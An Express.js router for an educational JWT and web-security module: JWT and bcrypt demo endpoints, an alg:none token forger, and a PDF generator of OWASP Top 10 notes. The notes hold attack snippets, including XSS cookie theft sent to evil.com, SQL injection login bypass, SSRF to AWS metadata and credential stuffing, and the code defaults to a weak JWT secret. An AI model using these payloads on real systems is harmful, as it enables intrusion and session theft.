const express = require('express');
const router = express.Router();
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const PDFDocument = require('pdfkit');

// ─── JWT Encode ──────────────────────────────────────────
router.post('/jwt/encode', (req, res) => {
  try {
    const { header, payload, secret, algorithm } = req.body;
    const parsedPayload = typeof payload === 'string' ? JSON.parse(payload) : payload;
    const algo = algorithm || 'HS256';
    const token = jwt.sign(parsedPayload, secret || 'default-secret', { algorithm: algo });
    const parts = token.split('.');
    res.json({
      success: true,
      token,
      parts: {
        header: parts[0],
        payload: parts[1],
        signature: parts[2]
      },
      decoded: {
        header: JSON.parse(Buffer.from(parts[0], 'base64url').toString()),
        payload: JSON.parse(Buffer.from(parts[1], 'base64url').toString())
      }
    });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

// ─── JWT Decode ──────────────────────────────────────────
router.post('/jwt/decode', (req, res) => {
  try {
    const { token, secret, ignoreExpiration } = req.body;
    const parts = token.split('.');
    if (parts.length !== 3) {
      return res.status(400).json({ success: false, error: 'Invalid JWT format. Expected 3 parts separated by dots.' });
    }
    const headerDecoded = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
    const payloadDecoded = JSON.parse(Buffer.from(parts[1], 'base64url').toString());

    let verified = false;
    let verifyError = null;
    if (secret) {
      try {
        jwt.verify(token, secret, { ignoreExpiration: !!ignoreExpiration });
        verified = true;
      } catch (e) {
        verifyError = e.message;
      }
    }

    res.json({
      success: true,
      header: headerDecoded,
      payload: payloadDecoded,
      signature: parts[2],
      verified,
      verifyError
    });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

// ─── JWT Tamper (alg:none attack demo) ───────────────────
router.post('/jwt/tamper', (req, res) => {
  try {
    const { payload } = req.body;
    const parsedPayload = typeof payload === 'string' ? JSON.parse(payload) : payload;
    // Create a token with alg:none (manual construction)
    const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
    const payloadB64 = Buffer.from(JSON.stringify(parsedPayload)).toString('base64url');
    const tamperedToken = `${header}.${payloadB64}.`;

    res.json({
      success: true,
      tamperedToken,
      explanation: 'This token uses alg:none, meaning no signature verification. If a server accepts this, an attacker can forge any payload without knowing the secret key.',
      decoded: {
        header: { alg: 'none', typ: 'JWT' },
        payload: parsedPayload
      },
      warning: 'A properly configured server should REJECT tokens with alg:none. This is OWASP JWT vulnerability #1.'
    });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

// ─── Bcrypt Hash ─────────────────────────────────────────
router.post('/bcrypt/hash', async (req, res) => {
  try {
    const { password, rounds } = req.body;
    const saltRounds = parseInt(rounds) || 10;
    if (saltRounds < 1 || saltRounds > 20) {
      return res.status(400).json({ success: false, error: 'Salt rounds must be between 1 and 20' });
    }
    const start = Date.now();
    const salt = await bcrypt.genSalt(saltRounds);
    const hash = await bcrypt.hash(password, salt);
    const duration = Date.now() - start;

    res.json({
      success: true,
      password,
      hash,
      salt,
      rounds: saltRounds,
      durationMs: duration,
      explanation: `Hashed with ${saltRounds} salt rounds in ${duration}ms. Higher rounds = slower = more secure against brute force.`
    });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

// ─── Bcrypt Compare ──────────────────────────────────────
router.post('/bcrypt/compare', async (req, res) => {
  try {
    const { password, hash } = req.body;
    const start = Date.now();
    const match = await bcrypt.compare(password, hash);
    const duration = Date.now() - start;

    res.json({
      success: true,
      match,
      durationMs: duration,
      explanation: match
        ? '✅ Password matches the hash!'
        : '❌ Password does NOT match the hash.'
    });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

// ─── PDF Notes Generator ─────────────────────────────────
router.get('/pdf/notes', (req, res) => {
  const doc = new PDFDocument({ margin: 50, size: 'A4' });

  res.setHeader('Content-Type', 'application/pdf');
  res.setHeader('Content-Disposition', 'attachment; filename=JWT_Security_Notes.pdf');
  doc.pipe(res);

  // Helper functions
  const addTitle = (text) => {
    doc.fontSize(22).font('Helvetica-Bold').fillColor('#00ff88').text(text, { align: 'center' });
    doc.moveDown(0.5);
    doc.moveTo(50, doc.y).lineTo(545, doc.y).strokeColor('#00ff88').stroke();
    doc.moveDown(1);
  };

  const addHeading = (text) => {
    doc.fontSize(16).font('Helvetica-Bold').fillColor('#00ccff').text(text);
    doc.moveDown(0.5);
  };

  const addSubheading = (text) => {
    doc.fontSize(13).font('Helvetica-Bold').fillColor('#ff6600').text(text);
    doc.moveDown(0.3);
  };

  const addBody = (text) => {
    doc.fontSize(10).font('Helvetica').fillColor('#333333').text(text, { lineGap: 4 });
    doc.moveDown(0.5);
  };

  const addCode = (text) => {
    doc.fontSize(9).font('Courier').fillColor('#990000').text(text, { lineGap: 2 });
    doc.moveDown(0.5);
  };

  const checkPage = () => {
    if (doc.y > 700) doc.addPage();
  };

  // ─── Cover Page ────────────────────────────────────────
  doc.fontSize(32).font('Helvetica-Bold').fillColor('#00ff88').text('JWT & Web Security', { align: 'center' });
  doc.moveDown(0.5);
  doc.fontSize(18).font('Helvetica').fillColor('#00ccff').text('Complete Learning Notes', { align: 'center' });
  doc.moveDown(1);
  doc.fontSize(12).fillColor('#666666').text('Generated from XYBERDUMP JWT Learning Module', { align: 'center' });
  doc.text(`Date: ${new Date().toLocaleDateString()}`, { align: 'center' });
  doc.addPage();

  // ─── 1. JWT Fundamentals ───────────────────────────────
  addTitle('1. JWT Fundamentals');

  addHeading('What is JWT?');
  addBody('JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact, self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.');

  addHeading('JWT Structure');
  addBody('A JWT consists of three parts separated by dots (.):\n• Header: Contains the token type and signing algorithm\n• Payload: Contains claims (statements about the user and metadata)\n• Signature: Ensures the token hasn\'t been tampered with');
  addCode('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c');

  checkPage();
  addHeading('Static vs Dynamic Tokens');
  addBody('Static Tokens: Fixed tokens that don\'t change over time. Used as API keys or fixed authentication credentials. Security risk: if compromised, remain valid until manually revoked.\n\nDynamic Tokens: Generated per session/request with expiration. JWTs are typically dynamic tokens with exp (expiration) claims. Much more secure as they auto-expire.');

  checkPage();
  addHeading('Algorithms Used in JWT');
  addBody('• HS256 (HMAC-SHA256): Symmetric - same secret key for signing and verification\n• HS384 (HMAC-SHA384): Symmetric - 384-bit variant\n• HS512 (HMAC-SHA512): Symmetric - 512-bit variant\n• RS256 (RSA-SHA256): Asymmetric - private key signs, public key verifies\n• RS384/RS512: RSA variants with larger hashes\n• ES256 (ECDSA-SHA256): Elliptic curve - smaller keys, same security\n• PS256 (RSA-PSS): Probabilistic signature scheme\n• EdDSA: Edwards-curve Digital Signature Algorithm');

  checkPage();
  addHeading('Token Entropy');
  addBody('Entropy measures the randomness/unpredictability of a token:\n• Low entropy: Predictable patterns, susceptible to brute force\n• High entropy: Cryptographically random, resistant to guessing\n• JWT entropy depends on: secret key strength, algorithm, payload uniqueness\n• Minimum recommended: 256 bits of entropy for secrets\n• Use crypto.randomBytes(32) for Node.js secret generation');

  addHeading('JWT Workflow');
  addBody('1. Client sends credentials (username/password) to server\n2. Server validates credentials against database\n3. Server creates JWT with user claims and signs with secret\n4. Server sends JWT back to client\n5. Client stores JWT (localStorage, cookie, or memory)\n6. Client sends JWT in Authorization header for subsequent requests\n7. Server verifies JWT signature and extracts claims\n8. Server processes request based on JWT claims');

  doc.addPage();

  // ─── 2. OWASP Top 10 ──────────────────────────────────
  addTitle('2. OWASP Top 10 (2021)');

  const owaspItems = [
    {
      id: 'A01:2021',
      name: 'Broken Access Control',
      explanation: 'Access control enforces policy such that users cannot act outside of their intended permissions. Failures lead to unauthorized information disclosure, modification, or destruction of data.',
      example: 'A user modifies the URL from /user/123/profile to /user/456/profile and accesses another user\'s data (IDOR). Or a regular user accesses /admin/dashboard by directly navigating to it.',
      exploit: 'GET /api/users/456/data HTTP/1.1\\nAuthorization: Bearer <user123_token>\\n→ Server returns user 456\'s data because it only checks authentication, not authorization.',
      remediation: '• Deny by default • Implement server-side access control checks • Use RBAC/ABAC models • Log access control failures • Disable directory listing • JWT claims should include role verification'
    },
    {
      id: 'A02:2021',
      name: 'Cryptographic Failures',
      explanation: 'Failures related to cryptography which often lead to sensitive data exposure. Includes using weak algorithms, improper key management, or transmitting data in cleartext.',
      example: 'A website stores passwords using MD5 without salt. An attacker obtains the database dump and uses rainbow tables to crack passwords within minutes.',
      exploit: 'SELECT username, password FROM users;\\n→ Returns: admin:5f4dcc3b5aa765d61d8327deb882cf99\\n→ MD5 lookup: "password"',
      remediation: '• Use strong algorithms (bcrypt, Argon2 for passwords) • Enforce TLS 1.2+ • Never store sensitive data unnecessarily • Use authenticated encryption (AES-GCM) • Proper key management and rotation'
    },
    {
      id: 'A03:2021',
      name: 'Injection',
      explanation: 'An application is vulnerable when user-supplied data is not validated, filtered, or sanitized. Includes SQL injection, NoSQL injection, OS command injection, LDAP injection.',
      example: 'A login form with SQL injection: entering \' OR 1=1-- as username bypasses authentication.',
      exploit: 'POST /login\\nusername=admin\'--&password=anything\\n→ SQL: SELECT * FROM users WHERE username=\'admin\'--\' AND password=\'anything\'\\n→ Comment removes password check, returns admin user',
      remediation: '• Use parameterized queries/prepared statements • Input validation and sanitization • Use ORM/ODM properly • Apply least privilege to database accounts • Use WAF for additional protection'
    },
    {
      id: 'A04:2021',
      name: 'Insecure Design',
      explanation: 'Flaws in the design and architecture of an application. Unlike implementation bugs, insecure design cannot be fixed by a perfect implementation.',
      example: 'A password reset flow that relies on security questions with answers findable on social media. Or a booking system with no rate limiting on reservation holds.',
      exploit: 'An attacker researches target\'s social media:\\n→ Pet name? "Buddy" (from Instagram)\\n→ Mother\'s maiden name? "Smith" (from Facebook)\\n→ Account recovered with public information',
      remediation: '• Use threat modeling during design • Establish secure development lifecycle • Use secure design patterns • Limit resource consumption by user/service • Integration tests for critical flows'
    },
    {
      id: 'A05:2021',
      name: 'Security Misconfiguration',
      explanation: 'Missing or incorrect security hardening across any part of the application stack. Default configurations, incomplete configurations, open cloud storage, verbose error messages.',
      example: 'A server running with default admin credentials, directory listing enabled, or stack traces visible in production error pages exposing internal paths.',
      exploit: 'GET /admin HTTP/1.1\\n→ Default credentials admin:admin work\\n→ Or: error page reveals: Error at /var/www/app/controllers/user.js:42\\n→ Attacker now knows the framework and file structure',
      remediation: '• Automated hardening process • Minimal platform without unnecessary features • Review and update configurations regularly • Segmented application architecture • Send security directives (CSP, HSTS)'
    },
    {
      id: 'A06:2021',
      name: 'Vulnerable and Outdated Components',
      explanation: 'Using components (libraries, frameworks, software) with known vulnerabilities. Includes not knowing versions used, unsupported software, and not scanning for CVEs.',
      example: 'Using an old version of Apache Struts with CVE-2017-5638 (the Equifax breach vulnerability) that allows remote code execution via crafted Content-Type headers.',
      exploit: 'curl -H "Content-Type: %{(#_=\'multipart/form-data\').(#dm=@ognl...}" http://target/upload\\n→ Remote code execution on the server',
      remediation: '• Remove unused dependencies • Inventory component versions • Monitor CVE databases • Obtain components from official sources • Use Software Composition Analysis (SCA) tools'
    },
    {
      id: 'A07:2021',
      name: 'Identification and Authentication Failures',
      explanation: 'Weaknesses in authentication mechanisms. Includes credential stuffing, brute force, session management flaws, and weak password policies.',
      example: 'An application with no rate limiting on login. Attacker uses credential stuffing with lists of leaked passwords from other breaches to gain access.',
      exploit: 'for pass in leaked_passwords:\\n  response = POST /login {user: "admin", pass: pass}\\n  if response.status == 200: print("Found:", pass)\\n→ No lockout, no CAPTCHA, no rate limiting',
      remediation: '• Multi-factor authentication • Don\'t ship default credentials • Weak password checks • Rate limiting and account lockout • Server-side secure session management • Use JWT with proper expiration'
    },
    {
      id: 'A08:2021',
      name: 'Software and Data Integrity Failures',
      explanation: 'Code and infrastructure that does not protect against integrity violations. Includes insecure CI/CD pipelines, auto-updates without integrity verification, and insecure deserialization.',
      example: 'A Node.js application using an npm package that was compromised (supply chain attack like event-stream incident). Malicious code steals cryptocurrency wallet data.',
      exploit: 'npm install event-stream@3.3.6\\n→ Package includes flatmap-stream with obfuscated code\\n→ Targets Copay bitcoin wallet, steals private keys',
      remediation: '• Verify software/data integrity with signatures • Use npm audit, Snyk • Ensure CI/CD pipeline has proper access controls • Do not send unsigned/unencrypted serialized data • Review code and config changes'
    },
    {
      id: 'A09:2021',
      name: 'Security Logging and Monitoring Failures',
      explanation: 'Without logging and monitoring, breaches cannot be detected. Insufficient logging, unclear log messages, logs not monitored, and lack of alerting for suspicious activities.',
      example: 'An attacker performing SQL injection over weeks goes undetected because login failures aren\'t logged and there\'s no anomaly detection on database queries.',
      exploit: 'Attacker sends 10,000 SQLi attempts over 30 days\\n→ No logging of failed requests\\n→ No alerting on anomalous patterns\\n→ Data exfiltrated without detection for months',
      remediation: '• Log all login, access control, and validation failures • Ensure logs have enough context for forensics • Use centralized log management (ELK, Splunk) • Set up real-time alerting • Establish incident response plan'
    },
    {
      id: 'A10:2021',
      name: 'Server-Side Request Forgery (SSRF)',
      explanation: 'SSRF flaws occur when a web application fetches a remote resource without validating the user-supplied URL. Allows attacker to coerce the server to make requests to internal infrastructure.',
      example: 'A web application has an image preview feature that fetches URLs. Attacker provides http://169.254.169.254/latest/meta-data/ to access AWS EC2 metadata including IAM credentials.',
      exploit: 'POST /api/preview\\n{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role"}\\n→ Server fetches internal AWS metadata\\n→ Returns IAM credentials with S3 access',
      remediation: '• Sanitize and validate all client-supplied URLs • Use allowlists for permitted domains/IPs • Deny access to private IP ranges • Don\'t send raw responses to clients • Use network-level segmentation'
    }
  ];

  owaspItems.forEach((item, index) => {
    checkPage();
    addHeading(`${item.id} - ${item.name}`);
    addSubheading('A. Explanation');
    addBody(item.explanation);
    checkPage();
    addSubheading('B. Example');
    addBody(item.example);
    checkPage();
    addSubheading('C. How the Exploit Happens (POC)');
    addCode(item.exploit);
    checkPage();
    addSubheading('D. Remediation');
    addBody(item.remediation);
    if (index < owaspItems.length - 1) {
      doc.moveDown(1);
      doc.moveTo(50, doc.y).lineTo(545, doc.y).strokeColor('#cccccc').stroke();
      doc.moveDown(1);
    }
    checkPage();
  });

  doc.addPage();

  // ─── 3. Cookie Stealing ────────────────────────────────
  addTitle('3. Cookie Stealing');

  addHeading('What is a Cookie?');
  addBody('HTTP cookies are small pieces of data stored by the browser. They are sent with every request to the same domain. Cookies are used for:\n• Session management (login state, shopping carts)\n• Personalization (user preferences, themes)\n• Tracking (analytics, advertising)');

  addHeading('Cookie Attributes');
  addBody('• HttpOnly: Prevents JavaScript access (document.cookie)\n• Secure: Only sent over HTTPS\n• SameSite: Controls cross-origin sending (Strict/Lax/None)\n• Domain/Path: Restricts cookie scope\n• Expires/Max-Age: Cookie lifetime');

  checkPage();
  addHeading('How Cookies Are Stolen');
  addBody('1. Cross-Site Scripting (XSS): Inject script to read document.cookie\n2. Man-in-the-Middle: Intercept unencrypted HTTP traffic\n3. Session Sidejacking: Sniff cookies on unsecured WiFi (Firesheep)\n4. Cross-Site Request Forgery combined with cookie leakage\n5. Malware/Browser extensions stealing cookie databases');

  addHeading('Real Case: Firesheep (2010)');
  addBody('Firesheep was a Firefox extension that sniffed WiFi traffic on open networks and captured session cookies from sites like Facebook, Twitter when they used HTTP for authenticated pages. It demonstrated mass vulnerability of unencrypted session cookies.');

  checkPage();
  addHeading('POC: XSS Cookie Theft');
  addCode('<script>\\n  // Attacker injects this into a vulnerable page\\n  new Image().src = "https://evil.com/steal?cookie=" + document.cookie;\\n</script>\\n\\n// On attacker\'s server:\\napp.get("/steal", (req, res) => {\\n  console.log("Stolen cookie:", req.query.cookie);\\n  // Now attacker can use this session cookie\\n});');

  addHeading('Remediation');
  addBody('• Set HttpOnly flag on all session cookies\n• Set Secure flag to prevent transmission over HTTP\n• Use SameSite=Strict or SameSite=Lax\n• Implement Content Security Policy (CSP) headers\n• Sanitize all user input to prevent XSS\n• Use HTTPS everywhere\n• Rotate session IDs after login');

  doc.addPage();

  // ─── 4. Session Hijacking ─────────────────────────────
  addTitle('4. Session Hijacking');

  addHeading('What is a Session?');
  addBody('A session is a semi-permanent interactive information interchange between a client and server. After authentication, the server creates a session ID that identifies the user for subsequent requests. Sessions can be stored server-side (traditional) or client-side (JWT).');

  addHeading('Types of Session Attacks');
  addBody('1. Session Fixation: Attacker sets a known session ID before victim logs in\n2. Session Sidejacking: Sniffing session cookies from network traffic\n3. Session Prediction: Guessing session IDs due to weak randomness\n4. Cross-Site Scripting: Stealing session tokens via XSS\n5. Man-in-the-Browser: Malware intercepting browser sessions');

  checkPage();
  addHeading('Real Case: WhatsApp Web Session Hijacking');
  addBody('In 2015, researchers demonstrated that WhatsApp Web sessions could be hijacked by stealing the QR code scanning session. The session token transmitted during QR scan could be intercepted, allowing an attacker to mirror the victim\'s WhatsApp on their browser.');

  addHeading('POC: Session Fixation Attack');
  addCode('// Step 1: Attacker gets a valid session ID\\nGET /login HTTP/1.1\\nResponse: Set-Cookie: SESSIONID=attacker_known_id\\n\\n// Step 2: Attacker sends victim a link with the fixed session\\nhttps://target.com/login?SESSIONID=attacker_known_id\\n\\n// Step 3: Victim logs in, server associates auth with attacker_known_id\\nPOST /login HTTP/1.1\\nCookie: SESSIONID=attacker_known_id\\nusername=victim&password=secret\\n\\n// Step 4: Attacker uses the same session ID\\nGET /dashboard HTTP/1.1\\nCookie: SESSIONID=attacker_known_id\\n→ Access granted as victim!');

  checkPage();
  addHeading('Remediation');
  addBody('• Regenerate session ID after login (invalidate old one)\n• Use cryptographically strong random session IDs\n• Set appropriate cookie attributes (HttpOnly, Secure, SameSite)\n• Implement session timeouts (idle and absolute)\n• Bind sessions to client fingerprint (IP, User-Agent)\n• Use HTTPS for all authenticated pages\n• Implement concurrent session detection');

  doc.addPage();

  // ─── 5. JWT Manipulation ──────────────────────────────
  addTitle('5. JWT Manipulation & Attacks');

  addHeading('Common JWT Attacks');
  addBody('1. alg:none Attack: Changing algorithm to "none" to bypass signature verification\n2. Algorithm Confusion (RS256→HS256): Tricking server into using public key as HMAC secret\n3. Weak Secret Brute Force: Cracking weak HMAC secrets with tools like jwt_tool\n4. KID Injection: Exploiting the Key ID header for SQL injection or path traversal\n5. JKU/X5U Spoofing: Redirecting key URL to attacker-controlled server\n6. Claim Tampering: Modifying payload claims (role, sub) without proper verification');

  addHeading('alg:none Attack Step-by-Step');
  addCode('Original Token (HS256):\\nHeader: {"alg":"HS256","typ":"JWT"}\\nPayload: {"sub":"user","role":"user"}\\nSignature: HMACSHA256(header.payload, secret)\\n\\nTampered Token (alg:none):\\nHeader: {"alg":"none","typ":"JWT"}\\nPayload: {"sub":"user","role":"admin"}  ← changed!\\nSignature: (empty)\\n\\nResult: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyIiwicm9sZSI6ImFkbWluIn0.');

  checkPage();
  addHeading('Online Tools for JWT Analysis');
  addBody('• jwt.io - Decode, verify, and generate JWTs online\n• jwt_tool (GitHub) - Python-based JWT testing toolkit\n• Burp Suite JWT extensions - Automated JWT attack testing\n• CyberChef - General purpose decoding including Base64URL\n• token.dev - JWT debugger and inspector');

  addHeading('Remediation');
  addBody('• Always validate the algorithm server-side (whitelist allowed algorithms)\n• Use strong secrets (256+ bits of entropy)\n• Set and validate expiration (exp) claims\n• Use asymmetric algorithms (RS256, ES256) when possible\n• Implement token revocation (blacklist/database check)\n• Validate all claims (iss, aud, sub, exp, nbf)');

  doc.addPage();

  // ─── 6. Bcrypt ─────────────────────────────────────────
  addTitle('6. Introduction to Bcrypt');

  addHeading('What is Bcrypt?');
  addBody('Bcrypt is a password hashing function designed by Niels Provos and David Mazières in 1999. Based on the Blowfish cipher, it incorporates a salt to protect against rainbow table attacks and has an adaptive cost factor that makes it resistant to brute-force attacks.');

  addHeading('How Bcrypt Works');
  addBody('1. Generate a random 128-bit salt\n2. Combine password with salt\n3. Run the Blowfish-based key schedule (expensive operation)\n4. Repeat for 2^cost iterations (cost factor controls this)\n5. Output: $2b$[cost]$[22 char salt][31 char hash]');

  addHeading('Bcrypt Hash Format');
  addCode('$2b$12$LJ3m4ys3Lf0Xg9YGlNkPSOiVcKF/T7vLI2eMyPjjz7YNq.Jz8qDPi\\n ║  ║  ║                      ║\\n ║  ║  ║                      └── 31 chars: hash output\\n ║  ║  └── 22 chars: encoded salt\\n ║  └── cost factor (2^12 = 4096 iterations)\\n └── algorithm version (2b = current)');

  checkPage();
  addHeading('Cost Factor');
  addBody('The cost factor determines computational expense:\n• Cost 10: ~100ms per hash (minimum recommended)\n• Cost 12: ~300ms per hash (good balance)\n• Cost 14: ~1 second per hash (high security)\n• Cost 16: ~4 seconds per hash (very high security)\n\nIncrease cost factor as hardware improves. Recommended: start at 12, benchmark on your server.');

  addHeading('Bcrypt vs Other Hashing');
  addBody('• MD5/SHA1: FAST (bad for passwords) - no salt built in\n• SHA-256: Fast - not designed for passwords\n• Bcrypt: Slow (good) - built-in salt, adaptive cost\n• Scrypt: Memory-hard - resistant to GPU attacks\n• Argon2: Winner of PHC (2015) - memory and CPU hard, recommended for new projects');

  // ─── End ───────────────────────────────────────────────
  doc.moveDown(2);
  doc.fontSize(10).font('Helvetica').fillColor('#999999').text('Generated by XYBERDUMP JWT Learning Module', { align: 'center' });
  doc.text('© 2026 CyberSareen - For Educational Purposes Only', { align: 'center' });

  doc.end();
});

module.exports = router;
